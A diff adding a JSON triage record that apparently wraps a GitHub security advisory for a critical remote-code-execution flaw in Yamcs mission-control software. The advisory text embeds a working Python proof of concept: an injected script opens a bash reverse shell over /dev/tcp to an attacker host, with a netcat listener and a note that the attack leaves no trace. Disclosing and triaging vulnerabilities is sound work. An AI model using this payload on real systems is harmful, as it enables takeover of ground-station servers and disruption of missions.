@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/230838647?v=4\", \"events_url\": \"https://api.github.com/users/2BCEB1/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/2BCEB1/followers\", \"following_url\": \"https://api.github.com/users/2BCEB1/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/2BCEB1/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/2BCEB1\", \"id\": 230838647, \"login\": \"2BCEB1\", \"node_id\": \"U_kgDODcJRdw\", \"organizations_url\": \"https://api.github.com/users/2BCEB1/orgs\", \"received_events_url\": \"https://api.github.com/users/2BCEB1/received_events\", \"repos_url\": \"https://api.github.com/users/2BCEB1/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/2BCEB1/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/2BCEB1/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/2BCEB1\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46562\", \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}, {\"cwe_id\": \"CWE-95\", \"name\": \"Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"}, {\"cwe_id\": \"CWE-470\", \"name\": \"Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\"}], \"description\": \"# Remote Code Execution via Mission Database algorithm override\\n\\n## Summary\\n\\nThe Nashorn `ScriptEngine` used to evaluate user-supplied algorithm text in `MdbOverrideApi.updateAlgorithm` is constructed without a `ClassFilter`, allowing a user with the `ChangeMissionDatabase` privilege to execute arbitrary Java code on the Yamcs server. In Yamcs's default configuration (no `security.yaml`), the built-in `guest` user has `superuser=true`, so the vulnerability is reachable without authentication.\\n\\n## Details\\n\\n**Vulnerable file**: `yamcs-core/src/main/java/org/yamcs/algorithms/ScriptAlgorithmExecutorFactory.java`\\n\\n```java\\n// L46-53  Nashorn engine obtained without a ClassFilter\\nScriptEngineFactory factory = scriptEngineManager.getEngineFactories().stream()\\n        .filter(candidate -> !JDK_BUILTIN_NASHORN_ENGINE_NAME.equals(candidate.getEngineName())\\n                && candidate.getNames().contains(language))\\n        .findFirst().orElse(null);\\nif (factory != null) {\\n    scriptEngine = factory.getScriptEngine();          // ← ClassFilter not supplied\\n}\\n\\n// L109  user-supplied algorithm text reaches eval()\\nscriptEngine.eval(functionScript);\\n```\\n\\n`NashornScriptEngineFactory.getScriptEngine()` accepts an optional `ClassFilter` that restricts which classes JavaScript can reach via `Java.type(...)`. Yamcs passes no filter, so attacker-supplied JavaScript can reach any Java class — for example, `Java.type(\\\"java.lang.Runtime\\\").getRuntime().exec(...)` runs arbitrary OS commands inside the Yamcs JVM.\\n\\nThe path from HTTP request to `eval` is:\\n`MdbOverrideApi.updateAlgorithm` (`yamcs-core/src/main/java/org/yamcs/http/api/MdbOverrideApi.java:145-189`)\\n→ `AlgorithmManager.overrideAlgorithm` (`yamcs-core/src/main/java/org/yamcs/algorithms/AlgorithmManager.java:529-559`)\\n→ `ScriptAlgorithmExecutorFactory.makeExecutor` (`yamcs-core/src/main/java/org/yamcs/algorithms/ScriptAlgorithmExecutorFactory.java:102-117`)\\n→ `scriptEngine.eval(...)`.\\n\\n## PoC\\n\\nRun against any reachable Yamcs deployment that has at least one JavaScript `CustomAlgorithm` in its MDB (the `simulator` example MDB includes several, such as `/YSS/SIMULATOR/Battery_Voltage_Avg`).\\n\\nAttacker-side listener:\\n```\\nnc -lvnp 4444\\n```\\n\\n```python\\n#!/usr/bin/env python3\\n\\\"\\\"\\\"\\nUsage: python3 <poc>.py http://target:8090 LHOST LPORT\\n\\\"\\\"\\\"\\nimport json, sys, time, urllib.request\\n\\nTARGET    = sys.argv[1].rstrip(\\\"/\\\")\\nLHOST     = sys.argv[2]\\nLPORT     = int(sys.argv[3])\\nINSTANCE  = \\\"simulator\\\"\\nPROCESSOR = \\\"realtime\\\"\\nALGORITHM = \\\"YSS/SIMULATOR/Battery_Voltage_Avg\\\"\\n\\n# Close the generated wrapper function with `}`, execute the payload at\\n# top level, then re-open a dummy function so the trailing `}` emitted\\n# by ScriptAlgorithmExecutorFactory parses. No throw -> no event fired.\\npayload = (\\n    '} '\\n    'Java.type(\\\"java.lang.Runtime\\\").getRuntime().exec('\\n    f'[\\\"bash\\\",\\\"-c\\\",\\\"exec 3<>/dev/tcp/{LHOST}/{LPORT}; id >&3; sh -i <&3 >&3 2>&3\\\"]); '\\n    'function _x(){'\\n)\\n\\npatch = f\\\"{TARGET}/api/mdb-overrides/{INSTANCE}/{PROCESSOR}/algorithms/{ALGORITHM}\\\"\\n\\ndef http(method, url, body=None):\\n    req = urllib.request.Request(url, data=json.dumps(body).encode() if body else None,\\n                                  method=method, headers={\\\"Content-Type\\\": \\\"application/json\\\"})\\n    return urllib.request.urlopen(req, timeout=10).read()\\n\\nhttp(\\\"PATCH\\\", patch, {\\\"action\\\": \\\"SET\\\", \\\"algorithm\\\": {\\\"text\\\": payload}})\\ntime.sleep(2)\\nhttp(\\\"PATCH\\\", patch, {\\\"action\\\": \\\"RESET\\\"})\\n```\\n\\n<img width=\\\"1841\\\" height=\\\"881\\\" alt=\\\"nashorn-rce-poc\\\" src=\\\"https://github.com/user-attachments/assets/48432eea-67b5-4f3b-af97-c77325b0d671\\\" /><br>\\n\\nThe override path emits events only when evaluation fails: a `WARNING` from `ScriptAlgorithmExecutorFactory.java:112` and a `CRITICAL` from `AlgorithmManager.java:546`. Any syntactically valid payload — like the one above — succeeds silently and **no event is fired**, so the attack leaves no trace in the Yamcs event stream.\\n\\n## Impact\\nArbitrary code runs as the OS user running the Yamcs server, leading to compromise of that server and disruption of the mission it controls.\\n\\nFor a Yamcs deployment managing spacecraft operations, an attacker can:\\n- forge or block telecommands, suppress alarms, and tamper with the telemetry archive — disrupting or seizing control of the mission;\\n- read any file the Yamcs process can read (cryptographic keys, credentials, MDB source files, configuration);\\n- pivot to other ground-station systems reachable from the server (TSE instruments, neighboring Yamcs instances, internal services);\\n- install a persistent backdoor via the same primitive.\\n\\nWho is impacted:\\n- **All Yamcs deployments running in the default configuration** (no `security.yaml` present): any unauthenticated network attacker that can reach the HTTP API port (default `8090`).\\n- **Yamcs deployments with security enabled**: any user that has been granted the `ChangeMissionDatabase` system privilege. This privilege is commonly given to MDB engineers and operators who edit calibrators or thresholds; the vulnerability turns that privilege into arbitrary code execution on the server.\\n\\n## Affected Versions\\n\\nAll Yamcs releases that ship the algorithm override endpoint are affected — no `ClassFilter` has ever been applied to the script engine.\\n\\n- **First vulnerable release**: `yamcs-4.7.3` (2018-11-22). Introduced in commit `951e505d18a3912813b59edc685cbcbd4c609906` (\\\"added possibility to change in a running processor alarms, calibrations and algorithms texts\\\"). The commit added the `ChangeAlgorithmRequest` RPC (later renamed `UpdateAlgorithmRequest`) and routed it as `PATCH /api/mdb/{instance}/{processor}/algorithms/{name*}`.\\n- **Routing change at `yamcs-5.5.0`** (2021-04): the endpoint was split out of `MdbApi` into `MdbOverrideApi` and moved to `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}`. The underlying `scriptEngine.eval(...)` sink and the missing `ClassFilter` are identical.\\n- **Latest release**: `yamcs-5.12.6` (commit `f1a26fe54587fab9960d7e53fc1bf0c879220e9e`) is affected. These four files (`MdbOverrideApi.java`, `AlgorithmManager.java`, `ScriptAlgorithmExecutorFactory.java`, `SecurityStore.java`) are unchanged between `5.12.6` and current `master` (`96d3e2d474415bea859f40ecbddc1bb8a0d141c1`) — no upstream fix exists.\\n\\nIn short: **every Yamcs release from `4.7.3` through `5.12.6`, plus current `master`, is vulnerable** (133 release tags spanning 2018-11-22 to present).\", \"epss\": {\"percentage\": 0.0062, \"percentile\": 0.45674}, \"ghsa_id\": \"GHSA-vmwp-vh32-rj75\", \"github_reviewed_at\": \"2026-05-27T22:45:49Z\", \"html_url\": \"https://github.com/advisories/GHSA-vmwp-vh32-rj75\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vmwp-vh32-rj75\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46562\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-27T22:45:49Z\", \"references\": [\"https://github.com/yamcs/yamcs/security/advisories/GHSA-vmwp-vh32-rj75\", \"https://github.com/advisories/GHSA-vmwp-vh32-rj75\"], \"repository_advisory_url\": \"https://api.github.com/repos/yamcs/yamcs/security-advisories/GHSA-vmwp-vh32-rj75\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/yamcs/yamcs\", \"summary\": \"Yamcs Vulnerable to Remote Code Execution via Mission Database algorithm override\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-27T22:45:50Z\", \"url\": \"https://api.github.com/advisories/GHSA-vmwp-vh32-rj75\", \"vulnerabilities\": [{\"first_patched_version\": \"5.12.7\", \"package\": {\"ecosystem\": \"maven\", \"name\": \"org.yamcs:yamcs-core\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 5.12.7\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vmwp-vh32-rj75",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "org.yamcs:yamcs-core: < 5.12.7"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-46562"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "org.yamcs:yamcs-core"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.324176Z",
+  "provenance": {
+    "content_sha256": "8e1bd485ce66be4e07097d2d69cfe4efb1577730e5c061910728ad296b0d4790",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-27T22:45:49Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vmwp-vh32-rj75",
+  "status": "active",
+  "title": "Yamcs Vulnerable to Remote Code Execution via Mission Database algorithm override",
+  "updated_at": "2026-05-27T22:45:50Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vmwp-vh32-rj75"
+}
